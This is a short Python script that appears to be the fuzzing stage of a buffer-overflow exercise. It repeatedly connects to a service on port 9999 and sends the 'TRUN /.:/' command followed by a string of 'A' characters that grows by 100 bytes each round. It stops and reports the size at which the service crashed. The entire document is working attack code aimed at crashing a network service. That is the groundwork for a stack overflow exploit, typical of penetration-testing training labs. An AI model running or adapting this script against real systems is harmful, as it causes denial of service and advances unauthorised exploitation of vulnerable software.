#! /usr/bin/python

import sys
import socket
from time import sleep

IP ='10.6.51.255'
PORT = 9999

buffer ="A" * 100


while True:
        try:
               s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               s.connect((IP,PORT))
               trun ='TRUN /.:/'
               s.send((trun.encode() + buffer.encode()))
               s.close()
         
               sleep(1)
               buffer = buffer + "A" *100

        except:
              print("Your buffer crashed the program at %s bytes" % str(len(buffer)))
              sys.exit()
        
